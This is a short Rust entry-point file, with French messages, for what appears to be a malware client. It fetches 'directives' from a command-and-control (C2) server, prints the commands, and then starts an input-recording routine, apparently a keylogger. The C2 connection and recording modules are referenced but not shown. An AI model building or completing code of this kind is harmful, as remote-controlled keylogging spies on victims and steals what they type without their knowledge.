mod connexion;
mod input;

#[tokio::main]
async fn main() {
    match connexion::get_directives().await {
        Ok(commands) => {
            println!("Commandes récupérées :");
            for command in &*commands {
                println!("{}", command);
            }
        },

        Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
    }

    input::recording();
}